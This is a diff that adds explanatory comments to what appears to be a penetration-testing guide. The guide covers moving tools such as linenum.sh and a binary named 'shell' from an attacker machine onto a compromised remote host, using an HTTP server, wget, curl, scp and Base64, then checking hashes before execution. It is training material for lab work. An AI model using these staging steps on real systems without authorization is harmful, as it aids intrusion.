@@ -70,6 +70,7 @@ Use Python's built-in HTTP server on your attack machine, then download files to
 cd /tmp
 python3 -m http.server 8000
 ```
+> Starts a simple HTTP server in /tmp, serving all files in that directory on port 8000. Change the port if 8000 is in use; run from a different directory to serve different files.
 
 **Response:**
 ```
@@ -84,11 +85,13 @@ This creates a listening HTTP server on port 8000, serving files from the curren
 ```bash
 wget http://<YOUR_IP>:<PORT>/<FILENAME>
 ```
+> Downloads the file from your HTTP server. Replace YOUR_IP with your tun0 address, PORT with the server port, and FILENAME with the file you placed in /tmp.
 
 **Example:**
 ```bash
 wget http://10.10.14.1:8000/linenum.sh
 ```
+> Real example: pulls linenum.sh from the attacker's HTTP server on port 8000. The file saves to the current directory on the remote host.
 
 **Response:**
 ```
@@ -106,11 +109,13 @@ If wget is not available, use curl with the `-o` flag to specify the output file
 ```bash
 curl http://<YOUR_IP>:<PORT>/<FILENAME> -o <OUTPUT_NAME>
 ```
+> `-o` specifies the local filename to save to. Use this instead of wget when wget is absent from the target.
 
 **Example:**
 ```bash
 curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
 ```
+> Downloads linenum.sh and saves it with the same name. Use `-O` (capital) to automatically use the filename from the URL without typing it twice.
 
 **Key Flags:**
 - `-o`: Specify output filename (required for saving)
@@ -146,6 +151,7 @@ Secure Copy (SCP) is the most secure and reliable method when SSH credentials ar
 ```bash
 scp <LOCAL_FILE> <USERNAME>@<REMOTE_HOST>:<REMOTE_PATH>
 ```
+> Copies a local file to the remote host over SSH. Requires SSH access and valid credentials; substitute your file, username, IP, and destination path.
 
 ### Example: Copy Local File to Remote Host
 
@@ -153,6 +159,7 @@ scp <LOCAL_FILE> <USERNAME>@<REMOTE_HOST>:<REMOTE_PATH>
 ```bash
 scp linenum.sh user@remotehost:/tmp/linenum.sh
 ```
+> Pushes linenum.sh from your attacker machine to /tmp on the remote. Swap `user` and `remotehost` for actual credentials and target IP.
 
 **Response:**
 ```
@@ -166,6 +173,7 @@ linenum.sh                                        100%   45KB   1.2MB/s   00:00
 ```bash
 scp user@remotehost:/tmp/linenum.sh ./linenum.sh
 ```
+> Pulls a file from the remote host to your local current directory. Reverse the source/destination compared to the upload command.
 
 This downloads a file from the remote server to your local machine.
 
@@ -177,6 +185,7 @@ If you have an SSH private key instead of password:
 ```bash
 scp -i /path/to/private/key linenum.sh user@remotehost:/tmp/linenum.sh
 ```
+> `-i` specifies the private key file for key-based authentication instead of a password. Swap the key path, filename, user, and host.
 
 **Flag:**
 - `-i`: Specify SSH private key file path
@@ -207,6 +216,7 @@ When network restrictions prevent direct file transfers, you can encode files in
 ```bash
 base64 shell -w 0
 ```
+> Encodes the file named `shell` to Base64 and prints it all on one line (`-w 0` disables line wrapping). Replace `shell` with any file you want to transfer.
 
 **Flags:**
 - `-w 0`: Disable line wrapping (outputs all on one line for easy copy-paste)
@@ -224,6 +234,7 @@ On the remote host (with code execution), create a file with the Base64 string:
 ```bash
 echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeAQAAAAAAABAAAAAAAAAABA0AAAAAAAAABAAAAAgAAAAEAAAAFAAAAgAEAAACAEQAAgBEAAAB8EQAAAHgRAAAAAAAAEQAAAAAAAAAAAEAAAAAQAAAAAwAAAJgRAAAAAAGQAAAA...SNIP...<REST_OF_BASE64_STRING> | base64 -d > shell
 ```
+> Pastes the full Base64 string, decodes it with `base64 -d`, and writes the raw bytes to `shell`. Replace the placeholder string with the actual Base64 output from your attacker machine.
 
 **Break Down:**
 - `echo <base64_string>`: Output the Base64 string
@@ -266,6 +277,7 @@ When transferring files—especially binaries and exploits—you must verify tha
 ```bash
 file shell
 ```
+> Identifies the actual file type by reading its magic bytes — confirms the transfer didn't corrupt the binary. Replace `shell` with whatever filename you used.
 
 **Response Example:**
 ```
@@ -280,6 +292,7 @@ This confirms the file is a valid ELF binary (in this case). For scripts, it mig
 ```bash
 md5sum shell
 ```
+> Computes the MD5 hash of the local file. Run the same command on the remote host and compare — matching hashes confirm an intact transfer.
 
 **Response:**
 ```
@@ -290,6 +303,7 @@ d41d8cd98f00b204e9800998ecf8427e  shell
 ```bash
 md5sum shell
 ```
+> Run this on the remote to get the transferred file's hash. If it matches the attacker-side hash, the file arrived intact.
 
 **Comparison:**
 If hashes match → File transferred successfully ✅  
@@ -313,6 +327,7 @@ sha256sum shell
 sha256sum shell
 # a1b2c3d4e5f6... shell (must match)
 ```
+> Use sha256sum instead of md5sum for cryptographically stronger verification. Same usage — run on both machines and compare the output strings.
 
 ### Quick Validation Checklist
 
@@ -348,6 +363,7 @@ python3 -m http.server 8000
 # Terminal output:
 # Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)...
 ```
+> Copies tools to /tmp so the HTTP server serves them, then starts the server. Use your actual tun0 IP in the wget/curl commands on the target side.
 
 **On Remote Host (reverse shell):**
 
@@ -366,6 +382,7 @@ file shell  # Verify it's an ELF binary
 md5sum shell
 # Output: a1b2c3d4e5f6g7h8i9j0... shell
 ```
+> `chmod +x` makes the file executable, `file` confirms the binary type, and `md5sum` gives the hash to compare against your attacker machine. Replace 10.10.14.1 with your tun0 IP.
 
 **Back on Attack Machine:**
 
@@ -374,6 +391,7 @@ md5sum shell
 md5sum /tmp/shell
 # Output: a1b2c3d4e5f6g7h8i9j0... shell (MUST MATCH)
 ```
+> Computes the hash of your original file on the attacker machine. Must match the remote hash from Step 5; any difference means the file was corrupted in transit.
 
 **If hashes match:** File transferred successfully, safe to execute ✅
 
@@ -394,6 +412,7 @@ base64 /tmp/shell -w 0 > shell.b64
 head -c 100 shell.b64
 # Output: f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeAQAAAAAAABAAAAAAAAAABA0...
 ```
+> Encodes the binary to a single-line Base64 string and saves it to shell.b64. The `head -c 100` preview lets you confirm the encoding worked before copy-pasting the full string.
 
 **On Remote Host (reverse shell):**
 
@@ -411,6 +430,7 @@ file shell
 md5sum shell
 # Output: a1b2c3d4e5f6g7h8i9j0... shell
 ```
+> Paste the full Base64 string inside the single quotes, then pipe through `base64 -d` to reconstruct the binary. `file` and `md5sum` confirm integrity before execution.
 
 **Back on Attack Machine:**
 
@@ -419,6 +439,7 @@ md5sum shell
 md5sum /tmp/shell
 # MUST MATCH the remote hash
 ```
+> Final integrity check on the attacker side. If both hashes match, the Base64 round-trip was lossless and the binary is safe to run.
 
 ---
 
